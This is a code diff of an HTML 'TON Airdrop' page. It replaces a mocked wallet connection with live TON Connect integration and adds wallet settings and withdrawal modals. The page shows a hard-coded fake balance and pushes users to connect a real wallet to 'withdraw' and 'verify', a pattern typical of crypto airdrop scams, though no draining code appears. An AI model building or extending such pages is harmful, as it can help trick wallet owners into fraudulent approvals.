@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Airdrop - Educational Design</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         /* --- Basic Setup --- */
         body {
@@ -11,13 +12,12 @@
             background-color: #f0f2f5; /* Light gray color outside the app */
             margin: 0;
             padding: 0;
-            user-select: none; /* Prevents text selection on a mobile-like app */
         }
 
         .app-container {
             width: 100%;
             max-width: 100%;
-            background-color: #f0f2f5;
+            background-color: #f0f2f5; /* Changed: This is now the main gray background */
             border-radius: 0;
             box-shadow: none;
             overflow: hidden;
@@ -33,7 +33,7 @@
             border-bottom: 1px solid #eaeaea;
             position: relative;
             margin-bottom: 25px;
-            background-color: #ffffff;
+            background-color: #ffffff; /* Added: Header has a white background */
         }
 
         .header .title-container {
@@ -80,12 +80,12 @@
 
         /* --- Balance Section (Screenshot 2) --- */
         .balance-section {
-            background-color: #ffffff;
+            background-color: #ffffff; /* This is the white card */
             border-radius: 16px;
             padding: 24px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 30px; /* Space below the card */
         }
 
         .balance-header {
@@ -116,13 +116,6 @@
             color: #8a8a8a;
             cursor: pointer;
             line-height: 1;
-            /* Added for settings state */
-            opacity: 0; 
-            transition: opacity 0.3s;
-        }
-        
-        .settings-icon.show {
-            opacity: 1;
         }
 
         .balance-amount {
@@ -144,17 +137,17 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
-            transition: background-color 0.2s;
         }
-        
-        .primary-btn:active {
-            background-color: #333333;
+
+        .primary-btn.danger {
+             background-color: #e53935; /* Red color for disconnect */
         }
         
         /* --- Get More Airdrops Section (Screenshot 2) --- */
         .get-more-section {
             margin-top: 30px;
             margin-bottom: 30px;
+            /* This section title stays on the gray background */
         }
 
         .section-title {
@@ -176,10 +169,9 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background-color: #ffffff; /* Changed to white for better contrast/feel */
+            background-color: #f7f7f7; /* Light gray task cards */
             padding: 12px 16px;
             border-radius: 12px;
-            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05); /* Added subtle shadow */
         }
         
         .task-info {
@@ -192,11 +184,11 @@
             width: 44px;
             height: 44px;
             border-radius: 50%;
+            /* ইমোজিকে সেন্টারে আনার জন্য যোগ করা হলো */
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 24px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
         }
         
         .task-icon.icon-1 { background-color: #ffc107; }
@@ -217,6 +209,7 @@
         .inline-ton-logo {
             width: 14px;
             height: 14px;
+            /* পরিবর্তিত হয়েছে: margin-left থেকে margin-right করা হলো */
             margin-right: 4px;
             margin-left: 0;
             vertical-align: middle;
@@ -227,29 +220,24 @@
             color: #000;
             border: none;
             border-radius: 16px;
-            padding: 8px 20px;
+            padding: 8px 24px;
             font-weight: 600;
             font-size: 15px;
             cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        
-        .go-btn:active {
-            background-color: #d8d8dc;
         }
 
         /* --- Information Section (Screenshot 1/3) --- */
         .info-section {
-            background-color: #ffffff;
-            border-radius: 16px;
-            padding: 24px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            background-color: #ffffff; /* Added: White card */
+            border-radius: 16px; /* Added */
+            padding: 24px; /* Added */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); /* Added */
             margin-bottom: 20px;
         }
         
         .info-section .section-title {
             font-size: 18px;
-            padding-bottom: 10px;
+            padding-bottom: 10px; /* Space between title and text */
         }
 
         .info-section p {
@@ -262,16 +250,11 @@
         /* --- Claim Section (Screenshot 1/3) --- */
         .claim-section {
             text-align: center;
-            background-color: #ffffff;
-            border-radius: 16px;
-            padding: 24px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            background-color: #ffffff; /* Added: White card */
+            border-radius: 16px; /* Added */
+            padding: 24px; /* Added */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); /* Added */
             margin-bottom: 20px;
-            display: none; /* Hidden by default */
-        }
-        
-        .claim-section.show {
-             display: block;
         }
 
         .claim-box {
@@ -314,10 +297,10 @@
         
         /* --- Bottom Card Wrapper --- */
         .bottom-card {
-            background-color: #ffffff;
-            border-radius: 16px;
-            padding: 24px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            background-color: #ffffff; /* Added: White card */
+            border-radius: 16px; /* Added */
+            padding: 24px; /* Added */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); /* Added */
             margin-bottom: 20px;
         }
 
@@ -360,88 +343,79 @@
             color: #aaaaaa;
             font-size: 14px;
             font-weight: 500;
+            /* This stays on the gray background */
         }
         
-        /* --- Modal/Popup Styles --- */
-        .modal-overlay {
+        /* --- === Modal Styles === --- */
+        .modal-backdrop {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background-color: rgba(0, 0, 0, 0.5);
-            display: flex;
+            display: none; /* Initially hidden */
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.3s, visibility 0.3s;
         }
-
-        .modal-overlay.show {
-            opacity: 1;
-            visibility: visible;
-        }
-
+        
         .modal-content {
             background-color: #ffffff;
-            border-radius: 16px;
             padding: 24px;
+            border-radius: 16px;
             width: 90%;
-            max-width: 350px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            transform: scale(0.9);
-            transition: transform 0.3s ease-out;
+            max-width: 400px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            position: relative;
         }
         
-        .modal-overlay.show .modal-content {
-            transform: scale(1);
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
         }
-
-        .modal-content h3 {
-            margin-top: 0;
-            font-size: 18px;
+        
+        .modal-title {
+            font-size: 20px;
             font-weight: 600;
-            margin-bottom: 10px;
+            margin: 0;
+        }
+        
+        .modal-close-btn {
+            font-size: 24px;
+            font-weight: 600;
+            color: #8a8a8a;
+            cursor: pointer;
+            background: none;
+            border: none;
+            line-height: 1;
+        }
+        
+        .modal-body p {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #333;
+            margin-top: 0;
+            margin-bottom: 20px;
         }
 
-        .modal-content p {
-            font-size: 15px;
-            color: #555;
-            margin-bottom: 20px;
-            line-height: 1.4;
-        }
-        
-        .modal-content .primary-btn {
-            margin-top: 0;
-            background-color: #0098ea;
-        }
-        
-        .modal-content .primary-btn:active {
-            background-color: #0077c9;
-        }
-        
-        .address-display {
+        .modal-body .address-container {
             font-size: 14px;
-            font-weight: 500;
-            color: #333;
-            padding: 8px 12px;
+            color: #555;
             background-color: #f0f2f5;
+            padding: 12px;
             border-radius: 8px;
-            margin-bottom: 15px;
-            overflow-wrap: break-word;
-            word-wrap: break-word;
-            hyphens: auto;
+            word-wrap: break-word; /* Ensure long addresses wrap */
+            margin-bottom: 20px;
         }
-        
-        .disconnected-message {
-            margin-top: 10px;
-            font-size: 15px;
-            color: #777;
+
+        #wallet-address {
+            font-weight: 500;
+            color: #000;
         }
-        
+
     </style>
 </head>
 <body>
@@ -461,11 +435,10 @@
                 <div class="balance-header">
                     <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhnqz9kGWNmfSZvGJrt__XxF_e_d3QFH4s5YdD10OjY9Kj0i6TsDdQZKhyWOwyj5IqHFy-mLxyKj30iX5tzecU3HB1P9C-zLeMKJOGszohsBbV8P99rWFYT0KCD7sW71yV_Gb3BprZhQ8-QrmYiaQwue9WtKlO2dV4C25AyiDmsG5OfcB2-jrlu8xN56fa/s450/image_downloader_1760986006457.png" alt="TON Logo" class="balance-ton-logo">
                     <span class="balance-title">$TON</span>
-                    <span class="settings-icon" id="settingsIcon">&#9881;</span>
+                    <span class="settings-icon">&#9881;</span>
                 </div>
                 <div class="balance-amount">17.00</div>
-                <button class="primary-btn" id="mainActionButton">Withdrawal</button>
-                <div class="disconnected-message" id="disconnectedMessage" style="display: none;">Wallet Not Connected</div>
+                 <button class="primary-btn" id="withdraw-btn">Withdrawal</button>
             </section>
 
             <section class="get-more-section">
@@ -475,7 +448,7 @@
                         <div class="task-info">
                             <div class="task-icon icon-1">📺</div> <div class="task-details">
                                 <div class="task-title">Ads Limit - 0/10</div> <div class="task-reward">
-                                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhnqz9kGWNmfSZvGJrt__XxF_e_d3QFH4s5YdD10OjY9Kj0i6TsDdQZKhyWOwyj5IqHFy-mLxyKj30iX5tzecU3HB1P9C-zLeMKJOGszohsBbV8P99rWFYT0KCD7sW71yV_Gb3BprZhQ8-QrmYiaQwuf87d8/s450/image_downloader_1760986006457.png" alt="TON" class="inline-ton-logo">
+                                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhnqz9kGWNmfSZvGJrt__XxF_e_d3QFH4s5YdD10OjY9Kj0i6TsDdQZKhyWOwyj5IqHFy-mLxyKj30iX5tzecU3HB1P9C-zLeMKJOGszohsBbV8P99rWFYT0KCD7sW71yV_Gb3BprZhQ8-QrmYiaQwue9WtKlO2dV4C25AyiDmsG5OfcB2-jrlu8xN56fa/s450/image_downloader_1760986006457.png" alt="TON" class="inline-ton-logo">
                                     $TON 1
                                 </div>
                             </div>
@@ -494,7 +467,7 @@ Let’s explore new opportunities together, spark more engagement, and make digi
           </p>
             </section>
 
-            <section class="claim-section" id="claimSection">
+            <section class="claim-section">
                 <div class="claim-box">
                     <span class="min-withdrawal">⚠️ Minimum withdrawal</span>
                     <div>
@@ -506,10 +479,10 @@ Let’s explore new opportunities together, spark more engagement, and make digi
                 <button class="primary-btn">Claim Now</button>
             </section>
 
-            <section class="partners-grid">
-                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmm389hi4JnrKnvdTVSQf9LG9_ZCO0mRGYkWqRM8ENJGXWmiCdtVRLnQIXPvn9TuGsbw2vNiJ_JYqPeNzabQgDXoH31hR2N28YsuecXd1DNrnjFLJ6sbWRwsAffWuXzwwpLbJDAHVa8213qDGxhcuJy1FQz3Rl9jPe_XScRtuJsSHlQQ3yRMgaCm2AnSjE/s1536/file_00000000807861f78f81ff46ec00fa94%20(1).png" alt="Partner Logos">
-            </section>
-            
+                <section class="partners-grid">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmm389hi4JnrKnvdTVSQf9LG9_ZCO0mRGYkWqRM8ENJGXWmiCdtVRLnQIXPvn9TuGsbw2vNiJ_JYqPeNzabQgDXoH31hR2N28YsuecXd1DNrnjFLJ6sbWRwsAffWuXzwwpLbJDAHVa8213qDGxhcuJy1FQz3Rl9jPe_XScRtuJsSHlQQ3yRMgaCm2AnSjE/s1536/file_00000000807861f78f81ff46ec00fa94%20(1).png" alt="Partner Logos">
+                </section>
+            </div>
 
         </main>
 
@@ -518,109 +491,138 @@ Let’s explore new opportunities together, spark more engagement, and make digi
         </footer>
     </div>
     
-    <div class="modal-overlay" id="connectModal">
+    <div class="modal-backdrop" id="settings-modal">
         <div class="modal-content">
-            <h3>Connect Your TON Wallet</h3>
-            <p>To withdraw your earned $TON, you must securely connect your wallet using the TON Connect protocol.</p>
-            <button class="primary-btn" id="connectWalletBtn">Connect TON Wallet</button>
+            <div class="modal-header">
+                <h2 class="modal-title">Wallet Settings</h2>
+                <button class="modal-close-btn">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p>You are connected with the following wallet:</p>
+                <div class="address-container">
+                    <strong>Address:</strong>
+                    <span id="wallet-address"></span>
+                </div>
+                <button class="primary-btn danger" id="disconnect-btn">Disconnect</button>
+            </div>
         </div>
     </div>
     
-    <div class="modal-overlay" id="withdrawModal">
+    <div class="modal-backdrop" id="withdrawal-modal">
         <div class="modal-content">
-            <h3>Confirm Withdrawal</h3>
-            <p>You are about to withdraw 17.00 $TON. A small network fee may apply.</p>
-            <button class="primary-btn" id="verifyWithdrawBtn">Verify & Withdraw</button>
+            <div class="modal-header">
+                <h2 class="modal-title">Confirm Withdrawal</h2>
+                <button class="modal-close-btn">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p>Please verify that you want to proceed with the withdrawal. This action will be processed after verification.</p>
+                <button class="primary-btn" id="verify-btn">Verify</button>
+            </div>
         </div>
     </div>
     
-    <div class="modal-overlay" id="settingsModal">
-        <div class="modal-content">
-            <h3>Wallet Status</h3>
-            <p>Your wallet is securely connected to this airdrop application.</p>
-            <div class="address-display" id="walletAddressDisplay"></div>
-            <button class="primary-btn" style="background-color: #dc3545;" id="disconnectWalletBtn">Disconnect Wallet</button>
-        </div>
-    </div>
-
-
     <script>
-        // --- DOM Elements ---
-        const mainActionButton = document.getElementById('mainActionButton');
-        const settingsIcon = document.getElementById('settingsIcon');
-        const connectModal = document.getElementById('connectModal');
-        const connectWalletBtn = document.getElementById('connectWalletBtn');
-        const withdrawModal = document.getElementById('withdrawModal');
-        const verifyWithdrawBtn = document.getElementById('verifyWithdrawBtn');
-        const settingsModal = document.getElementById('settingsModal');
-        const disconnectWalletBtn = document.getElementById('disconnectWalletBtn');
-        const walletAddressDisplay = document.getElementById('walletAddressDisplay');
-        const disconnectedMessage = document.getElementById('disconnectedMessage');
+        document.addEventListener('DOMContentLoaded', () => {
+            // 1. TON Connect UI শুরু করা
+            const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                // আপনার Vercel সাইটে এই ফাইলটি থাকতে হবে
+                manifestUrl: 'https://git-main-tem-vrs-projects.vercel.app/tonconnect-manifest.json',
+            });
 
-        // --- Mock Data and Functions ---
-        // A mock address to simulate a connected wallet
-        const MOCK_ADDRESS = "EQB-q8rP4m...fJ-WvR3X9QcE"; 
-        
-        // Use a flag in localStorage to maintain connection state across page loads
-        const isWalletConnected = () => localStorage.getItem('tonWalletConnected') === 'true';
-
-        // Function to simulate a TON Wallet connection
-        function mockConnectWallet() {
-            // In a real app, this is where you'd call the TON Connect SDK:
-            // tonConnect.connectWallet().then(address => { ... })
+            // 2. DOM Elements গুলোকে সিলেক্ট করা
+            const withdrawBtn = document.getElementById('withdraw-btn');
+            const settingsIcon = document.querySelector('.settings-icon');
             
-            // For the mock:
-            localStorage.setItem('tonWalletConnected', 'true');
-            localStorage.setItem('tonWalletAddress', MOCK_ADDRESS);
-            updateUI(); // Refresh the interface
-            closeAllModals(); // Close the modal
-            alert('✅ Wallet Connected Successfully!'); // Show confirmation
-        }
-
-        // Function to simulate a TON Wallet disconnection
-        function mockDisconnectWallet() {
-            localStorage.removeItem('tonWalletConnected');
-            localStorage.removeItem('tonWalletAddress');
-            updateUI(); // Refresh the interface
-            closeAllModals(); // Close the modal
-            alert('❌ Wallet Disconnected.'); // Show confirmation
-        }
-
-        // Function to simulate the withdrawal process
-        function mockVerifyAndWithdraw() {
-            // In a real app, this is where you'd sign and send the transaction
+            const settingsModal = document.getElementById('settings-modal');
+            const withdrawalModal = document.getElementById('withdrawal-modal');
+            const allCloseButtons = document.querySelectorAll('.modal-close-btn');
             
-            // For the mock:
-            closeAllModals();
-            mainActionButton.textContent = 'Processing...';
-            mainActionButton.disabled = true;
+            const disconnectBtn = document.getElementById('disconnect-btn');
+            const walletAddressSpan = document.getElementById('wallet-address');
 
-            setTimeout(() => {
-                // Simulate success or failure after a delay
-                alert('⏳ Withdrawal Request Sent! (Simulation)');
-                mainActionButton.textContent = 'Withdrawal';
-                mainActionButton.disabled = false;
-            }, 2000);
-        }
+            // 3. Helper Functions (Modal খোলা ও বন্ধ করার জন্য)
+            function openModal(modal) {
+                modal.style.display = 'flex';
+            }
 
-        // --- UI Update Function ---
-        function updateUI() {
-            if (isWalletConnected()) {
-                const address = localStorage.getItem('tonWalletAddress');
-                
-                // 1. Update Main Button and Message
-                mainActionButton.textContent = 'Withdrawal';
-                mainActionButton.style.backgroundColor = '#000000';
-                mainActionButton.disabled = false;
-                disconnectedMessage.style.display = 'none';
-                
-                // 2. Show Settings Icon
-                settingsIcon.classList.add('show');
-                
-                // 3. Update Settings Modal Content
-                walletAddressDisplay.textContent = address;
-                
-            } else {
-                // 1. Update Main Button and Message
-                mainActionButton.textContent = 'Connect Wallet';
-                mainActionButton.style.
+            function closeModal(modal) {
+                modal.style.display = 'none';
+            }
+            
+            // সব "close" বাটনে ক্লিক ইভেন্ট যোগ করা
+            allCloseButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    closeModal(settingsModal);
+                    closeModal(withdrawalModal);
+                });
+            });
+            
+            // মডালের বাইরে ক্লিক করলে বন্ধ করার জন্য
+            [settingsModal, withdrawalModal].forEach(modal => {
+                modal.addEventListener('click', (e) => {
+                    if (e.target === modal) {
+                        closeModal(modal);
+                    }
+                });
+            });
+
+            // ঠিকানা ছোট করার জন্য একটি Helper Function
+            function formatAddress(address) {
+                if (!address) return '';
+                return `${address.slice(0, 6)}...${address.slice(-4)}`;
+            }
+            
+            // 4. মূল ফাংশনালিটি
+            
+            // "Withdrawal" বাটনে ক্লিক
+            withdrawBtn.addEventListener('click', () => {
+                if (tonConnectUI.connected) {
+                    // যদি ওয়ালেট কানেক্ট থাকে, উইথড্রয়াল মডাল দেখান
+                    openModal(withdrawalModal);
+                } else {
+                    // যদি ওয়ালেট কানেক্ট না থাকে, কানেক্ট মডাল দেখান
+                    tonConnectUI.openModal();
+                }
+            });
+
+            // "Settings" আইকনে ক্লিক
+            settingsIcon.addEventListener('click', () => {
+                if (tonConnectUI.connected) {
+                    // যদি ওয়ালেট কানেক্ট থাকে, ঠিকানা দেখান ও সেটিং মডাল খুলুন
+                    const address = tonConnectUI.account.address;
+                    walletAddressSpan.textContent = formatAddress(address);
+                    openModal(settingsModal);
+                } else {
+                    // কানেক্ট না থাকলে কানেক্ট মডাল দেখান
+                    tonConnectUI.openModal();
+                }
+            });
+            
+            // "Disconnect" বাটনে ক্লিক
+            disconnectBtn.addEventListener('click', () => {
+                tonConnectUI.disconnect();
+                closeModal(settingsModal);
+            });
+            
+            // "Verify" বাটনে ক্লিক (Withdrawal Modal)
+            document.getElementById('verify-btn').addEventListener('click', () => {
+                alert('Verification process started!'); // এখানে আপনার ভেরিফিকেশন লজিক যোগ করুন
+                closeModal(withdrawalModal);
+            });
+            
+            // ওয়ালেটের অবস্থা পরিবর্তন হলে (কানেক্ট/ডিসকানেক্ট) তা পর্যবেক্ষণ করা
+            tonConnectUI.onStatusChange(wallet => {
+                if (wallet) {
+                    console.log('Wallet connected:', wallet.account.address);
+                    // কানেক্ট হওয়ার পর অটোমেটিক মডাল বন্ধ করতে পারেন
+                    closeModal(settingsModal);
+                    closeModal(withdrawalModal);
+                } else {
+                    console.log('Wallet disconnected.');
+                }
+            });
+
+        });
+    </script>
+</body>
+</html>
